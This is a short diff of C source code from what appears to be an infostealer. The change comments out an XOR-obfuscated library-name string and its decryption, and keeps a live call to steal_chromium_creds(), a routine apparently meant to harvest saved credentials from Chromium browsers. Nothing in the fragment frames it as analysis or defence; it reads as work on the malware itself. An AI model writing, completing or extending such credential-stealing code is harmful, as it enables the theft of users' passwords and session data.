@@ -53,9 +53,8 @@ int main(void) {
         "correctement.\n");
 #endif
   }
-  char msvcrt_str[] = "\x47\x59\x5c\x49\x58\x5e\x04\x4e\x46\x46";
-  XOR_STR(msvcrt_str, strlen(msvcrt_str));
-
+  // char msvcrt_str[] = "\x47\x59\x5c\x49\x58\x5e\x04\x4e\x46\x46";
+  // XOR_STR(msvcrt_str, strlen(msvcrt_str));
   // apis.funcLoadLibraryA(msvcrt_str);
 
   steal_chromium_creds();
